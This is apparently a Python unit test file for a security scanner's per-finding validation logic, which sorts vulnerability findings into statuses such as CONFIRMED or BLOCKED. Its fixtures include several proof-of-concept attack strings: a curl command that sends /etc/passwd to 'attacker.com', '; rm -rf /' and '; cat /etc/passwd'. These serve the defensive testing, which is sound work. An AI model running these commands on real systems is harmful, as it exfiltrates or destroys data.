"""Unit tests for dast.per_finding — Tier 1.5 per-finding validation
(CONFIRMED / BLOCKED / UNREACHED / NOT_TESTED)."""

from __future__ import annotations

from dast.per_finding import (
    PerFindingValidation,
    _classify_rejection_rationale,
    _classify_runtime_error,
    _finding_id_for_index,
    _index_journal_by_finding,
    _index_sandbox_stderr_by_finding,
    derive_per_finding_validation,
    effective_findings,
    per_finding_stats,
)


# ── _finding_id_for_index ────────────────────────────────────────────────────


def test_finding_id_format_matches_dast_runner_convention() -> None:
    """Must align with dast.runner._scan_result_to_l1_output's H001/H002/... format."""
    assert _finding_id_for_index(0) == "H001"
    assert _finding_id_for_index(9) == "H010"
    assert _finding_id_for_index(99) == "H100"


# ── derive_per_finding_validation ────────────────────────────────────────────


def test_derive_no_dast_findings_all_not_tested() -> None:
    l1 = [
        {
            "cwe": "CWE-78",
            "type": "command_injection",
            "severity": "critical",
            "line": 42,
            "confidence": 0.9,
        },
        {
            "cwe": "CWE-89",
            "type": "sql_injection",
            "severity": "high",
            "line": 88,
            "confidence": 0.8,
        },
    ]
    # No journal -> NOT_TESTED for everything not in confirmed list
    out = derive_per_finding_validation(l1, [])
    assert len(out) == 2
    assert out[0].finding_id == "H001"
    assert out[0].cwe == "CWE-78"
    assert out[0].status == "NOT_TESTED"
    assert out[1].finding_id == "H002"
    assert out[1].status == "NOT_TESTED"


def test_derive_some_confirmed() -> None:
    l1 = [
        {"cwe": "CWE-78", "type": "cmd", "severity": "critical", "line": 1, "confidence": 1.0},
        {"cwe": "CWE-89", "type": "sql", "severity": "high", "line": 2, "confidence": 0.8},
        {"cwe": "CWE-22", "type": "path", "severity": "medium", "line": 3, "confidence": 0.6},
    ]
    out = derive_per_finding_validation(l1, ["H001", "H003"])
    assert out[0].status == "CONFIRMED"
    assert out[1].status == "NOT_TESTED"  # no journal entry
    assert out[2].status == "CONFIRMED"


def test_derive_preserves_finding_attributes() -> None:
    l1 = [{"cwe": "CWE-78", "type": "x", "severity": "high", "line": 42, "confidence": 0.85}]
    out = derive_per_finding_validation(l1, ["H001"])
    r = out[0]
    assert r.cwe == "CWE-78"
    assert r.type == "x"
    assert r.severity == "high"
    assert r.line == 42
    assert r.confidence == 0.85


def test_derive_handles_missing_fields() -> None:
    l1 = [{}]  # totally empty finding
    out = derive_per_finding_validation(l1, [])
    r = out[0]
    assert r.cwe == ""
    assert r.line is None
    assert r.confidence is None


def test_derive_skips_non_dict_entries() -> None:
    l1 = [{"cwe": "CWE-78"}, "not a dict", None, {"cwe": "CWE-89"}]
    out = derive_per_finding_validation(l1, [])
    # Non-dict entries skipped — but indexing IS preserved (the dict at
    # index 0 gets H001, the dict at index 3 gets H004, not H002)
    assert len(out) == 2
    ids = [r.finding_id for r in out]
    assert ids == ["H001", "H004"]


def test_derive_empty_l1_returns_empty() -> None:
    assert derive_per_finding_validation([], []) == []
    assert derive_per_finding_validation([], ["H001"]) == []


def test_derive_extra_dast_ids_no_l1_match_ignored() -> None:
    """If DAST claims H005 confirmed but L1 only has 2 findings, H005 has nothing to match."""
    l1 = [{"cwe": "CWE-78"}, {"cwe": "CWE-89"}]
    out = derive_per_finding_validation(l1, ["H001", "H005"])
    assert out[0].status == "CONFIRMED"
    assert out[1].status == "NOT_TESTED"  # H002 has no journal entry


# ── Tier 1.5: rejection rationale classifier ────────────────────────────────


def test_classify_blocked_keywords() -> None:
    assert (
        _classify_rejection_rationale(
            "validator rejected: input is sanitized via shlex.quote at line 42"
        )
        == "BLOCKED"
    )
    assert (
        _classify_rejection_rationale(
            "rejected — query uses parameterized statement, sql injection blocked"
        )
        == "BLOCKED"
    )
    assert (
        _classify_rejection_rationale("user input is escaped before rendering; safe from XSS")
        == "BLOCKED"
    )
    assert (
        _classify_rejection_rationale(
            "the path is validated against an allowlist before file operations"
        )
        == "BLOCKED"
    )


def test_classify_unreached_keywords() -> None:
    assert (
        _classify_rejection_rationale(
            "validator rejected: code path is unreachable from external input"
        )
        == "UNREACHED"
    )
    assert (
        _classify_rejection_rationale(
            "couldn't trigger the vulnerable code path during sandbox execution"
        )
        == "UNREACHED"
    )
    assert (
        _classify_rejection_rationale(
            "no input vector reaches this function; the sink is dead code"
        )
        == "UNREACHED"
    )
    assert (
        _classify_rejection_rationale("function never invoked from any reachable entry point")
        == "UNREACHED"
    )


def test_classify_other_for_inconclusive() -> None:
    assert (
        _classify_rejection_rationale(
            "validator rejected: insufficient evidence to confirm or refute"
        )
        == "OTHER"
    )
    assert _classify_rejection_rationale("rejected: hypothesis was inconclusive") == "OTHER"
    assert _classify_rejection_rationale("") == "OTHER"


def test_classify_blocked_takes_precedence_over_unreached() -> None:
    """If both keyword sets match, BLOCKED wins (defensive code is the
    more informative classification)."""
    text = "input is sanitized AND code path may be unreachable"
    assert _classify_rejection_rationale(text) == "BLOCKED"


# ── Journal indexing ─────────────────────────────────────────────────────────


def test_index_journal_picks_highest_priority_record() -> None:
    """When the same finding has multiple journal entries (multiple
    iterations or hypotheses), the indexer picks the most informative."""
    journal = [
        {"claim_id": "H001", "verdict": "rejected", "rationale": "short"},
        {"claim_id": "H001", "verdict": "confirmed", "rationale": "validator accepted"},
        {"claim_id": "H001", "verdict": "rejected", "rationale": "much longer rationale"},
    ]
    idx = _index_journal_by_finding(journal)
    # confirmed beats rejected
    assert idx["H001"]["verdict"] == "confirmed"


def test_index_journal_tiebreaks_by_rationale_length() -> None:
    """Two same-priority records — pick the one with more reasoning text."""
    journal = [
        {"claim_id": "H001", "verdict": "rejected", "rationale": "x"},
        {"claim_id": "H001", "verdict": "rejected", "rationale": "longer rejection text"},
    ]
    idx = _index_journal_by_finding(journal)
    assert idx["H001"]["rationale"] == "longer rejection text"


def test_index_journal_handles_empty() -> None:
    assert _index_journal_by_finding(None) == {}
    assert _index_journal_by_finding([]) == {}


# ── 4-status derivation with journal ─────────────────────────────────────────


def test_derive_with_journal_blocked_status() -> None:
    l1 = [{"cwe": "CWE-78", "confidence": 0.9}]
    journal = [
        {
            "claim_id": "H001",
            "verdict": "rejected",
            "rationale": "validator rejected: input is sanitized via shlex.quote",
        }
    ]
    out = derive_per_finding_validation(l1, [], journal)
    assert len(out) == 1
    assert out[0].status == "BLOCKED"
    assert out[0].rejection_reason and "shlex.quote" in out[0].rejection_reason


def test_derive_with_journal_unreached_status() -> None:
    l1 = [{"cwe": "CWE-22"}]
    journal = [
        {
            "claim_id": "H001",
            "verdict": "rejected",
            "rationale": "code path unreachable from any tested input",
        }
    ]
    out = derive_per_finding_validation(l1, [], journal)
    assert out[0].status == "UNREACHED"


def test_derive_with_journal_other_rejection_is_not_tested() -> None:
    """Rejection that doesn't match BLOCKED or UNREACHED keywords falls
    through to NOT_TESTED — neither defense nor unreachability proven."""
    l1 = [{"cwe": "CWE-89"}]
    journal = [
        {"claim_id": "H001", "verdict": "rejected", "rationale": "rejected: insufficient evidence"}
    ]
    out = derive_per_finding_validation(l1, [], journal)
    assert out[0].status == "NOT_TESTED"
    # But rejection_reason is preserved for surfacing
    assert out[0].rejection_reason == "rejected: insufficient evidence"


def test_derive_full_4_status_mix() -> None:
    """End-to-end: 4 L1 findings, one of each status."""
    l1 = [
        {"cwe": "CWE-78"},  # H001 -> CONFIRMED (in dast_findings)
        {"cwe": "CWE-89"},  # H002 -> BLOCKED (journal: sanitized)
        {"cwe": "CWE-22"},  # H003 -> UNREACHED (journal: dead code)
        {"cwe": "CWE-94"},  # H004 -> NOT_TESTED (no journal)
    ]
    journal = [
        {
            "claim_id": "H002",
            "verdict": "rejected",
            "rationale": "input is escaped before SQL execution",
        },
        {"claim_id": "H003", "verdict": "rejected", "rationale": "function is never invoked"},
    ]
    out = derive_per_finding_validation(l1, ["H001"], journal)
    assert [r.status for r in out] == ["CONFIRMED", "BLOCKED", "UNREACHED", "NOT_TESTED"]


def test_derive_confirmed_overrides_journal_rejection() -> None:
    """If finding_id is in dast_findings, it's CONFIRMED regardless of
    any journal records (they may be stale from earlier iterations)."""
    l1 = [{"cwe": "CWE-78"}]
    journal = [
        {"claim_id": "H001", "verdict": "rejected", "rationale": "earlier iteration said sanitized"}
    ]
    out = derive_per_finding_validation(l1, ["H001"], journal)
    assert out[0].status == "CONFIRMED"


# ── Tier 2 (v1.1): structured verdict precedence ────────────────────────────


def test_derive_refuted_with_unreached_rationale_maps_to_unreached() -> None:
    """v1.6: ``verdict=refuted`` now sub-classifies via rationale. When
    the rationale mentions the path wasn't reached (``never reached``),
    map to UNREACHED, not BLOCKED. Previously this was a known
    mis-categorization where everything refuted became BLOCKED."""
    l1 = [{"cwe": "CWE-78"}]
    journal = [
        {
            "claim_id": "H001",
            "verdict": "refuted",
            "rationale": "sandbox observed the input never reached subprocess",
        }
    ]
    out = derive_per_finding_validation(l1, [], journal)
    assert out[0].status == "UNREACHED"


def test_derive_refuted_with_defense_rationale_maps_to_blocked() -> None:
    """v1.6: ``verdict=refuted`` + rationale mentions sanitization/
    validation -> BLOCKED (file's own code defended)."""
    l1 = [{"cwe": "CWE-78"}]
    journal = [
        {
            "claim_id": "H001",
            "verdict": "refuted",
            "rationale": "input is sanitized via shlex.quote before subprocess.run",
        }
    ]
    out = derive_per_finding_validation(l1, [], journal)
    assert out[0].status == "BLOCKED"


def test_derive_refuted_no_specific_reason_maps_to_rejected() -> None:
    """v1.6 NEW: ``verdict=refuted`` with rationale that mentions
    neither a defense nor unreached path -> REJECTED. This is the
    architectural FP-reduction-win status that was previously
    collapsed into BLOCKED, making it invisible in the output."""
    l1 = [{"cwe": "CWE-78"}]
    journal = [
        {
            "claim_id": "H001",
            "verdict": "refuted",
            "rationale": "sandbox executed the function with the attack input "
            "and observed no exploit firing; behavior is benign",
        }
    ]
    out = derive_per_finding_validation(l1, [], journal)
    assert out[0].status == "REJECTED"
    assert "benign" in (out[0].rejection_reason or "")


def test_derive_refuted_empty_rationale_maps_to_rejected() -> None:
    """v1.6: refuted with no rationale -> REJECTED (best assumption is
    sandbox-grounded refutation; no defense / no unreach signal to
    suggest otherwise)."""
    l1 = [{"cwe": "CWE-78"}]
    journal = [{"claim_id": "H001", "verdict": "refuted", "rationale": ""}]
    out = derive_per_finding_validation(l1, [], journal)
    assert out[0].status == "REJECTED"


def test_derive_inconclusive_verdict_maps_to_not_tested() -> None:
    """`verdict=inconclusive` means sandbox couldn't decide either way."""
    l1 = [{"cwe": "CWE-89"}]
    journal = [
        {
            "claim_id": "H001",
            "verdict": "inconclusive",
            "rationale": "sandbox returned partial trace",
        }
    ]
    out = derive_per_finding_validation(l1, [], journal)
    assert out[0].status == "NOT_TESTED"


def test_derive_journal_confirmed_verdict_takes_priority_over_text() -> None:
    """Even if the rationale text would heuristic-match BLOCKED, a
    `confirmed` verdict overrides — the validator confirmed it."""
    l1 = [{"cwe": "CWE-78"}]
    journal = [
        {
            "claim_id": "H001",
            "verdict": "confirmed",
            "rationale": "input is sanitized but the bypass worked anyway",
        }
    ]
    out = derive_per_finding_validation(l1, [], journal)
    assert out[0].status == "CONFIRMED"


def test_derive_rejected_verdict_falls_through_to_text_classifier() -> None:
    """`rejected` is a hypothesis-quality fail, not a behavioral signal.
    Falls through to rationale text classifier — same Tier 1.5 path."""
    l1 = [{"cwe": "CWE-78"}, {"cwe": "CWE-89"}]
    journal = [
        {
            "claim_id": "H001",
            "verdict": "rejected",
            "rationale": "input is sanitized via shlex.quote at line 42",
        },
        {
            "claim_id": "H002",
            "verdict": "rejected",
            "rationale": "code path unreachable from external input",
        },
    ]
    out = derive_per_finding_validation(l1, [], journal)
    assert out[0].status == "BLOCKED"
    assert out[1].status == "UNREACHED"


# ── DAST-203: NOT_TESTED sub-reason classification ──────────────────────────


def test_not_planned_reason_when_no_journal_entry() -> None:
    """No journal record -> not_planned (orchestrator skipped)."""
    l1 = [{"cwe": "CWE-78"}]
    out = derive_per_finding_validation(l1, [], [])
    assert out[0].status == "NOT_TESTED"
    assert out[0].not_tested_reason == "not_planned"
    assert out[0].rejection_reason is None


# ── v1.6: granular NOT_TESTED reasons ─────────────────────────────────────


def test_dast_not_attempted_reason_when_dast_skipped() -> None:
    """When DAST never ran on the file (L1 verdict below trigger),
    the reason is structural -- not budget, not unfireable."""
    l1 = [{"cwe": "CWE-78"}]
    out = derive_per_finding_validation(l1, [], [], dast_attempted=False)
    assert out[0].status == "NOT_TESTED"
    assert out[0].not_tested_reason == "dast_not_attempted"


def test_unfireable_pattern_cwe_reason_for_cwe_506() -> None:
    """CWE-506 (embedded malicious code) is pattern-detection; DAST
    has no exploit payload that fires it. NOT_TESTED reason should be
    unfireable_pattern_cwe, not the generic 'inconclusive' or
    'not_planned' that previously hid the architectural truth."""
    l1 = [{"cwe": "CWE-506"}]
    out = derive_per_finding_validation(l1, [], [])
    assert out[0].status == "NOT_TESTED"
    assert out[0].not_tested_reason == "unfireable_pattern_cwe"


def test_unfireable_pattern_cwe_reason_for_cwe_451() -> None:
    """CWE-451 (UI representation, e.g., clickjacking) is browser-level
    and outside the Python sandbox payload space."""
    l1 = [{"cwe": "CWE-451"}]
    out = derive_per_finding_validation(l1, [], [])
    assert out[0].not_tested_reason == "unfireable_pattern_cwe"


def test_unfireable_pattern_cwe_accepts_lowercase() -> None:
    """CWE normalization: cwe-506 / 506 / CWE-506 all recognized."""
    out = derive_per_finding_validation([{"cwe": "cwe-506"}], [], [])
    assert out[0].not_tested_reason == "unfireable_pattern_cwe"
    out2 = derive_per_finding_validation([{"cwe": "506"}], [], [])
    assert out2[0].not_tested_reason == "unfireable_pattern_cwe"


def test_unfireable_pattern_cwe_does_not_override_confirmed_journal() -> None:
    """If DAST somehow CONFIRMED a pattern CWE via journal (e.g.,
    rare case where the orchestrator did run a probe), the
    CONFIRMED status wins. Don't downgrade real proof."""
    l1 = [{"cwe": "CWE-506"}]
    journal = [
        {
            "claim_id": "H001",
            "verdict": "confirmed",
            "rationale": "sandbox observed embedded payload execution",
        }
    ]
    out = derive_per_finding_validation(l1, [], journal)
    assert out[0].status == "CONFIRMED"


def test_non_python_file_reason_for_js() -> None:
    """JS files don't get the Python-probe path. When DAST didn't
    validate, the NOT_TESTED reason is non_python_file."""
    l1 = [{"cwe": "CWE-78"}]
    out = derive_per_finding_validation(l1, [], [], file_name="sandbox_runner.js")
    assert out[0].status == "NOT_TESTED"
    assert out[0].not_tested_reason == "non_python_file"


def test_non_python_file_reason_for_pth() -> None:
    """``.pth`` files trigger at Python import time but DAST has no
    direct probe path for them."""
    l1 = [{"cwe": "CWE-94"}]
    out = derive_per_finding_validation(l1, [], [], file_name="compat_hooks.pth")
    assert out[0].not_tested_reason == "non_python_file"


def test_python_file_not_misclassified_as_non_python() -> None:
    """``.py`` files are in scope -- shouldn't be flagged non_python_file
    when journal entry is missing. Falls back to not_planned."""
    l1 = [{"cwe": "CWE-78"}]
    out = derive_per_finding_validation(l1, [], [], file_name="real_module.py")
    assert out[0].not_tested_reason == "not_planned"


def test_dast_not_attempted_precedence_over_unfireable_cwe() -> None:
    """When DAST never ran on the file, every finding gets
    dast_not_attempted regardless of CWE. The structural reason wins."""
    l1 = [{"cwe": "CWE-506"}]  # would otherwise be unfireable_pattern_cwe
    out = derive_per_finding_validation(l1, [], [], dast_attempted=False)
    assert out[0].not_tested_reason == "dast_not_attempted"


def test_infra_stub_reason_when_sandbox_returns_stub() -> None:
    """DAST-203 case: sandbox returned stub trace -> infra_stub."""
    l1 = [{"cwe": "CWE-200"}]
    journal = [
        {
            "claim_id": "H001",
            "verdict": "rejected",
            "rationale": "Sandbox trace for H001 is a stub with no events (is_stub_no_trace=true)",
        }
    ]
    out = derive_per_finding_validation(l1, [], journal)
    assert out[0].status == "NOT_TESTED"
    assert out[0].not_tested_reason == "infra_stub"
    assert out[0].rejection_reason is not None
    assert "stub" in out[0].rejection_reason.lower()


def test_infra_stub_takes_precedence_over_blocked_keywords() -> None:
    """Even if rationale mentions 'sanitized' alongside the stub note,
    STUB classifier runs first — infra issue, not a defense observation."""
    l1 = [{"cwe": "CWE-78"}]
    journal = [
        {
            "claim_id": "H001",
            "verdict": "rejected",
            "rationale": "is_stub_no_trace=true; the input may be sanitized but couldn't verify",
        }
    ]
    out = derive_per_finding_validation(l1, [], journal)
    assert out[0].status == "NOT_TESTED"
    assert out[0].not_tested_reason == "infra_stub"


def test_inconclusive_reason_when_rationale_not_classifiable() -> None:
    """Rationale that doesn't match any classifier -> inconclusive."""
    l1 = [{"cwe": "CWE-89"}]
    journal = [
        {
            "claim_id": "H001",
            "verdict": "rejected",
            "rationale": "rejected: insufficient evidence to confirm or refute",
        }
    ]
    out = derive_per_finding_validation(l1, [], journal)
    assert out[0].status == "NOT_TESTED"
    assert out[0].not_tested_reason == "inconclusive"


def test_inconclusive_reason_for_inconclusive_verdict() -> None:
    """`verdict=inconclusive` directly maps to NOT_TESTED:inconclusive."""
    l1 = [{"cwe": "CWE-89"}]
    journal = [
        {
            "claim_id": "H001",
            "verdict": "inconclusive",
            "rationale": "sandbox returned partial trace",
        }
    ]
    out = derive_per_finding_validation(l1, [], journal)
    assert out[0].status == "NOT_TESTED"
    assert out[0].not_tested_reason == "inconclusive"


def test_not_tested_reason_is_none_for_non_not_tested_statuses() -> None:
    """CONFIRMED / BLOCKED / UNREACHED never set not_tested_reason."""
    l1 = [{"cwe": "CWE-78"}, {"cwe": "CWE-89"}, {"cwe": "CWE-22"}]
    journal = [
        {"claim_id": "H002", "verdict": "rejected", "rationale": "input is sanitized"},
        {"claim_id": "H003", "verdict": "rejected", "rationale": "path is unreachable"},
    ]
    out = derive_per_finding_validation(l1, ["H001"], journal)
    assert out[0].status == "CONFIRMED" and out[0].not_tested_reason is None
    assert out[1].status == "BLOCKED" and out[1].not_tested_reason is None
    assert out[2].status == "UNREACHED" and out[2].not_tested_reason is None


# ── PoC export — proof_of_concept + runtime_evidence on CONFIRMED ────────────


def test_confirmed_finding_surfaces_proof_of_concept_from_l1() -> None:
    """For CONFIRMED findings, the L1 vulnerability's proof_of_concept
    string should appear on the per-finding entry (demoable PoC)."""
    l1 = [
        {
            "cwe": "CWE-78",
            "type": "command_injection",
            "proof_of_concept": "curl http://attacker.com/?p=$(cat /etc/passwd | base64)",
            "confidence": 0.95,
        }
    ]
    out = derive_per_finding_validation(l1, ["H001"], [])
    assert out[0].status == "CONFIRMED"
    assert out[0].proof_of_concept == "curl http://attacker.com/?p=$(cat /etc/passwd | base64)"


def test_confirmed_finding_surfaces_runtime_evidence_from_journal() -> None:
    """When DAST has a journal record for a CONFIRMED finding, surface
    its rationale as runtime_evidence."""
    l1 = [{"cwe": "CWE-78", "proof_of_concept": "; rm -rf /"}]
    journal = [
        {
            "claim_id": "H001",
            "verdict": "confirmed",
            "rationale": "Sandbox observed subprocess.run with shell=True invoked attacker payload",
        }
    ]
    out = derive_per_finding_validation(l1, ["H001"], journal)
    assert out[0].status == "CONFIRMED"
    assert out[0].proof_of_concept == "; rm -rf /"
    assert out[0].runtime_evidence is not None
    assert "subprocess.run" in out[0].runtime_evidence


def test_confirmed_finding_no_poc_when_l1_lacks_one() -> None:
    """L1 may not always produce a proof_of_concept (older runs, refusals).
    proof_of_concept stays None in that case."""
    l1 = [{"cwe": "CWE-78"}]  # no proof_of_concept field
    out = derive_per_finding_validation(l1, ["H001"], [])
    assert out[0].status == "CONFIRMED"
    assert out[0].proof_of_concept is None


def test_blocked_finding_does_not_surface_poc() -> None:
    """PoC is meaningless on BLOCKED — the attack didn't work. Don't
    surface it (would mislead users into thinking exploitation worked)."""
    l1 = [
        {
            "cwe": "CWE-78",
            "proof_of_concept": "; rm -rf /",
        }
    ]
    journal = [
        {
            "claim_id": "H001",
            "verdict": "rejected",
            "rationale": "input is sanitized via shlex.quote",
        }
    ]
    out = derive_per_finding_validation(l1, [], journal)
    assert out[0].status == "BLOCKED"
    # PoC is suppressed for non-CONFIRMED statuses
    assert out[0].proof_of_concept is None


def test_poc_truncated_to_500_chars() -> None:
    """Defensive: very long PoCs (e.g., embedded large payloads) get
    truncated so the launch report stays readable."""
    long_poc = "A" * 1000
    l1 = [{"cwe": "CWE-78", "proof_of_concept": long_poc}]
    out = derive_per_finding_validation(l1, ["H001"], [])
    assert out[0].proof_of_concept is not None
    assert len(out[0].proof_of_concept) == 500


# ── PerFindingValidation.to_dict ─────────────────────────────────────────────


def test_to_dict_round_trip() -> None:
    r = PerFindingValidation(
        finding_id="H001",
        cwe="CWE-78",
        type="cmd",
        severity="high",
        line=42,
        status="CONFIRMED",
        confidence=0.9,
    )
    d = r.to_dict()
    assert d["finding_id"] == "H001"
    assert d["cwe"] == "CWE-78"
    assert d["status"] == "CONFIRMED"
    assert d["confidence"] == 0.9


# ── effective_findings (CONFIRMED-only filter for Effective CWE F1) ──────────


def test_effective_findings_filters_to_confirmed() -> None:
    l1 = [
        {"cwe": "CWE-78"},
        {"cwe": "CWE-89"},
        {"cwe": "CWE-22"},
    ]
    per_finding = [
        PerFindingValidation("H001", "CWE-78", "x", "high", 1, "CONFIRMED", 0.9),
        PerFindingValidation("H002", "CWE-89", "x", "high", 2, "BLOCKED", 0.7),
        PerFindingValidation("H003", "CWE-22", "x", "low", 3, "CONFIRMED", 0.5),
    ]
    eff = effective_findings(l1, per_finding)
    # Only CONFIRMED by default
    assert len(eff) == 2
    assert eff[0]["cwe"] == "CWE-78"
    assert eff[1]["cwe"] == "CWE-22"


def test_effective_findings_with_blocked_includes_them() -> None:
    """include_blocked=True surfaces real-but-mitigated vulns for
    defense-in-depth audits."""
    l1 = [{"cwe": "CWE-78"}, {"cwe": "CWE-89"}, {"cwe": "CWE-22"}]
    per_finding = [
        PerFindingValidation("H001", "CWE-78", "x", "high", 1, "CONFIRMED", 0.9),
        PerFindingValidation("H002", "CWE-89", "x", "high", 2, "BLOCKED", 0.7),
        PerFindingValidation("H003", "CWE-22", "x", "low", 3, "UNREACHED", 0.5),
    ]
    eff = effective_findings(l1, per_finding, include_blocked=True)
    assert len(eff) == 2  # CONFIRMED + BLOCKED, NOT UNREACHED
    cwes = {f["cwe"] for f in eff}
    assert cwes == {"CWE-78", "CWE-89"}


def test_effective_findings_accepts_dict_form() -> None:
    """When loaded from saved JSON, per_finding is dicts not dataclasses."""
    l1 = [{"cwe": "CWE-78"}, {"cwe": "CWE-89"}]
    per_finding_dicts = [
        {"finding_id": "H001", "status": "CONFIRMED"},
        {"finding_id": "H002", "status": "UNTESTED"},
    ]
    eff = effective_findings(l1, per_finding_dicts)
    assert len(eff) == 1
    assert eff[0]["cwe"] == "CWE-78"


def test_effective_findings_empty_when_none_confirmed() -> None:
    l1 = [{"cwe": "CWE-78"}]
    per_finding = [PerFindingValidation("H001", "CWE-78", "x", "high", 1, "NOT_TESTED", 0.5)]
    assert effective_findings(l1, per_finding) == []


# ── per_finding_stats ────────────────────────────────────────────────────────


def test_stats_basic() -> None:
    records = [
        PerFindingValidation("H001", "CWE-78", "x", "high", 1, "CONFIRMED", 0.9),
        PerFindingValidation("H002", "CWE-89", "x", "high", 2, "CONFIRMED", 0.8),
        PerFindingValidation("H003", "CWE-22", "x", "med", 3, "BLOCKED", 0.5),
        PerFindingValidation("H004", "CWE-94", "x", "med", 4, "NOT_TESTED", 0.6),
    ]
    s = per_finding_stats(records)
    assert s["n_findings"] == 4
    assert s["n_confirmed"] == 2
    assert s["n_blocked"] == 1
    assert s["n_unreached"] == 0
    assert s["n_not_tested"] == 1
    assert s["n_untested"] == 2  # legacy field — total - confirmed
    assert s["confirmed_pct"] == 50.0
    assert s["blocked_pct"] == 25.0


def test_stats_empty() -> None:
    s = per_finding_stats([])
    assert s["n_findings"] == 0
    assert s["confirmed_pct"] == 0.0


def test_stats_all_confirmed() -> None:
    records = [
        PerFindingValidation("H001", "CWE-78", "x", "high", 1, "CONFIRMED", 0.9),
        PerFindingValidation("H002", "CWE-89", "x", "high", 2, "CONFIRMED", 0.8),
    ]
    s = per_finding_stats(records)
    assert s["confirmed_pct"] == 100.0


def test_stats_accepts_dict_form() -> None:
    s = per_finding_stats(
        [
            {"finding_id": "H001", "status": "CONFIRMED"},
            {"finding_id": "H002", "status": "NOT_TESTED"},
        ]
    )
    assert s["n_confirmed"] == 1
    assert s["n_not_tested"] == 1
    assert s["confirmed_pct"] == 50.0


# ── v1.9 DAST-discovered findings (HRP_*/HRP_AL_*/HRP_C*) surfacing ──────


def test_hrp_finding_surfaces_in_per_finding_validation() -> None:
    """A Phase B+ runtime probe that confirms an exploit (HRP_0_0) had
    its evidence in ``findings_validated_meta`` only — prior to v1.9
    the per_finding builder iterated L1 vulns only, so the HRP row
    never showed up. v1.9 emits a synthetic CONFIRMED row from meta."""
    out = derive_per_finding_validation(
        # No L1 vulnerabilities — DAST discovered this net-new.
        l1_vulnerabilities=[],
        dast_validated_findings=["HRP_0_0"],
        journal_records=[],
        findings_validated_meta={
            "HRP_0_0": {
                "id": "HRP_0_0",
                "finding_ref": "HRP_0_0",
                "finding_type": "ssrf",
                "severity": "high",
                "cwe": "CWE-918",
                "line": None,
                "code_snippet": "createAuthFetch",
                "explanation": "Bearer token transmitted over plaintext HTTP",
                "data_flow_trace": "endpointUrl → createAuthFetch → fetch",
                "proof_of_concept": "Configure MCP node with http:// URL",
                "confidence": 1.0,
                "runtime_evidence": "captured Authorization header in plaintext HTTP request",
            }
        },
    )
    assert len(out) == 1
    pf = out[0]
    assert pf.finding_id == "HRP_0_0"
    assert pf.status == "CONFIRMED"
    assert pf.type == "ssrf"
    assert pf.severity == "high"
    assert pf.cwe == "CWE-918"
    assert pf.confidence == 1.0
    assert "MCP node" in (pf.proof_of_concept or "")
    assert "Authorization header" in (pf.runtime_evidence or "")


def test_hrp_finding_coexists_with_l1_findings() -> None:
    """When BOTH L1-claimed findings AND DAST-discovered findings
    exist, both flow through. L1 rows first (preserving order),
    DAST-discovered rows appended after."""
    l1_vulns = [
        {
            "type": "ssrf",
            "cwe": "CWE-918",
            "severity": "high",
            "confidence": 0.8,
            "line": 10,
        }
    ]
    out = derive_per_finding_validation(
        l1_vulnerabilities=l1_vulns,
        dast_validated_findings=["H001", "HRP_AL_T0_H1"],
        journal_records=[
            {
                "claim_id": "H001",
                "verdict": "confirmed",
                "rationale": "sandbox confirmed L1 SSRF",
            },
        ],
        findings_validated_meta={
            "HRP_AL_T0_H1": {
                "finding_ref": "HRP_AL_T0_H1",
                "finding_type": "command_injection",
                "severity": "critical",
                "cwe": "CWE-77",
                "proof_of_concept": "; cat /etc/passwd",
                "confidence": 1.0,
                "runtime_evidence": "spawned /bin/sh with attacker payload",
            }
        },
    )
    assert len(out) == 2
    # L1 finding first.
    assert out[0].finding_id == "H001"
    assert out[0].status == "CONFIRMED"
    # DAST-discovered finding second.
    assert out[1].finding_id == "HRP_AL_T0_H1"
    assert out[1].status == "CONFIRMED"
    assert out[1].type == "command_injection"
    assert out[1].severity == "critical"


def test_hrp_meta_supports_phase_b_chain_findings() -> None:
    """HRP_C* (Phase B chain probes) also surface via the same map."""
    out = derive_per_finding_validation(
        l1_vulnerabilities=[],
        dast_validated_findings=["HRP_C0_0"],
        journal_records=[],
        findings_validated_meta={
            "HRP_C0_0": {
                "finding_ref": "HRP_C0_0",
                "finding_type": "chain_command_injection",
                "severity": "critical",
                "cwe": "CWE-77",
                "runtime_evidence": "step 2 spawned shell",
            }
        },
    )
    assert len(out) == 1
    assert out[0].finding_id == "HRP_C0_0"
    assert out[0].status == "CONFIRMED"


def test_hrp_meta_falls_back_to_journal_rationale() -> None:
    """If the meta dict somehow lacks runtime_evidence but a journal
    record carries the rationale, use the journal text. Belt-and-
    braces for any future code path that stores partial meta."""
    out = derive_per_finding_validation(
        l1_vulnerabilities=[],
        dast_validated_findings=["HRP_0_0"],
        journal_records=[
            {
                "claim_id": "HRP_0_0",
                "verdict": "confirmed",
                "rationale": "runtime probe CONFIRMED ssrf in fetch_url",
            }
        ],
        findings_validated_meta={
            "HRP_0_0": {
                "finding_ref": "HRP_0_0",
                "finding_type": "ssrf",
                "severity": "high",
                "cwe": "CWE-918",
                # Note: no runtime_evidence in the meta.
            }
        },
    )
    assert out[0].runtime_evidence is not None
    assert "ssrf" in out[0].runtime_evidence


def test_hrp_meta_skips_when_id_already_emitted_via_l1() -> None:
    """Defensive: if a meta entry's finding_id collides with an L1
    finding (shouldn't happen with the HRP_/H001 namespace split but
    defensive), the L1 row wins — no double row."""
    l1_vulns = [
        {
            "type": "ssrf",
            "cwe": "CWE-918",
            "severity": "high",
            "confidence": 0.8,
        }
    ]
    out = derive_per_finding_validation(
        l1_vulnerabilities=l1_vulns,
        dast_validated_findings=["H001"],
        journal_records=[],
        findings_validated_meta={
            "H001": {
                "finding_ref": "H001",
                "finding_type": "command_injection",  # different type — would conflict
                "severity": "critical",
                "cwe": "CWE-77",
            }
        },
    )
    # Only ONE row for H001 — the L1 row, NOT the meta row.
    assert len(out) == 1
    assert out[0].finding_id == "H001"
    # L1 finding's type survived (ssrf), meta's type (command_injection) was ignored.
    assert out[0].type == "ssrf"


def test_hrp_meta_handles_missing_meta_gracefully() -> None:
    """Pre-v1.9 callers don't pass findings_validated_meta. The new
    parameter has a None default; behavior must be identical to v1.8
    in that case (no extra rows, no crash)."""
    out = derive_per_finding_validation(
        l1_vulnerabilities=[],
        dast_validated_findings=["HRP_0_0"],
        journal_records=[],
        # findings_validated_meta NOT passed — defaults to None.
    )
    # Without meta we can't render an HRP row. v1.8 back-compat: HRP
    # IDs in dast_validated_findings stay invisible from the per-
    # finding view (just like before v1.9). Operators upgrading get
    # the new rows once the orchestrator populates the meta map.
    assert out == []


def test_hrp_meta_ignores_non_dict_entries() -> None:
    """Defensive: a malformed meta entry (not a dict) is skipped, not
    crashed-on. Same fail-soft posture as the rest of this module."""
    out = derive_per_finding_validation(
        l1_vulnerabilities=[],
